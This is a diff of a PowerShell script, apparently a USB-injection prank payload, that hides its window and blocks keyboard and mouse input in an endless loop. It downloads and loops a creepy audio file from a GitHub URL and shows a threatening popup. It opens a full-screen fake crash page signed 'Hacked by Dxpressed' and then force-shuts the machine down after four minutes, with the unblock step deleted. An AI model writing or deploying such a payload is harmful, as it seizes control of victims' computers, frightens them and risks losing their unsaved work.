@@ -2,59 +2,117 @@ Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
-  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
   [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
   [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 
-# Hide the PowerShell window
+# Hide PowerShell window
 $hWnd = [Win32]::GetForegroundWindow()
 [Win32]::ShowWindow($hWnd, 0)
 
-# Lock input
-[Win32]::BlockInput($true)
+# 🔒 Continuously block keyboard and mouse input
+Start-Job {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class InputBlocker {
+        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+    }
+"@
+    while ($true) {
+        [InputBlocker]::BlockInput($true)
+        Start-Sleep -Milliseconds 500
+    }
+}
 
-# Creepy popup
+# 🪦 Creepy popup
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")
 
-# BSOD HTML with JavaScript audio autoplay hack
+# 🔊 Play creepy audio from GitHub (whispers.wav)
+Add-Type -TypeDefinition @"
+using System.Media;
+public class Audio {
+    public static void Play(string url) {
+        System.Net.WebClient web = new System.Net.WebClient();
+        string temp = System.IO.Path.GetTempFileName() + ".wav";
+        web.DownloadFile(url, temp);
+        SoundPlayer player = new SoundPlayer(temp);
+        player.PlayLooping();
+    }
+}
+"@
+[Audio]::Play("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.wav")
+
+# 💀 Glitchy crash screen with creepy style
 $html = @"
 <html>
-<body style='background: url(https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg) no-repeat center center fixed; background-size: cover; color:#00ff00; font-family:Consolas; font-size:24px; margin:0; overflow:hidden;'>
-<center style='margin-top: 10%;'>
-<h1>😵</h1>
-<h2>Your PC is dead.</h2>
-<p>It saw something it shouldn’t have.</p>
-<p>There is no reboot.</p>
-<p>We warned you.</p>
-</center>
-<script>
-  let audio = new Audio("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.mp3");
-  audio.loop = true;
-  audio.volume = 1.0;
-  setTimeout(() => {{
-    audio.play().catch(e => console.log("Autoplay blocked"));
-  }}, 500); // Give browser a sec before attempting playback
-
-  let glitch = () => {{
-    document.body.style.opacity = Math.random();
-    document.body.style.transform = "scale(" + (1 + Math.random()/10) + ")";
-    setTimeout(glitch, 100);
-  }};
-  glitch();
-</script>
+<head>
+  <link href='https://fonts.googleapis.com/css2?family=Creepster&family=UnifrakturCook:wght@700&display=swap' rel='stylesheet'>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background: url('https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #ff0000;
+      font-family: 'Creepster', 'UnifrakturCook', cursive;
+      font-size: 32px;
+      text-shadow: 2px 2px 10px black;
+    }
+    .centered {
+      margin-top: 10%;
+      text-align: center;
+    }
+    h1 {
+      font-size: 80px;
+      animation: pulse 2s infinite;
+    }
+    h2, p {
+      animation: flicker 1.5s infinite;
+    }
+    @keyframes flicker {
+      0%, 18%, 22%, 25%, 53%, 57%, 100% {
+        opacity: 1;
+      }
+      20%, 24%, 55% {
+        opacity: 0;
+      }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); color: darkred; }
+      100% { transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class='centered'>
+    <h1>☠️</h1>
+    <h2>Your soul is mine.</h2>
+    <p>The machine is cursed.</p>
+    <p>You shouldn’t have summoned me.</p>
+    <p style="font-size: 20px;">Hacked by Dxpressed</p>
+  </div>
+  <script>
+    let glitch = () => {
+      document.body.style.opacity = Math.random() * 0.9 + 0.1;
+      document.body.style.transform = "scale(" + (1 + Math.random()/15) + ")";
+      setTimeout(glitch, 150);
+    };
+    glitch();
+  </script>
 </body>
 </html>
 "@
 
-# Save and open BSOD
+# Save and launch the fake BSOD
 $bsodFile = "$env:TEMP\bsod.html"
 $html | Out-File $bsodFile -Encoding ASCII
 Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile
 
-# Glitch mouse cursor (shake)
+# 🌀 Random cursor shaking
 Start-Job {
   Add-Type -AssemblyName System.Windows.Forms
   for ($i = 0; $i -lt 100; $i++) {
@@ -63,7 +121,6 @@ Start-Job {
   }
 }
 
-# ⏳ Wait 4 minutes before shutdown
-Start-Sleep -Seconds 180
-[Win32]::BlockInput($false)
+# ⏳ Wait 4 minutes, then shutdown
+Start-Sleep -Seconds 240
 Stop-Computer -Force
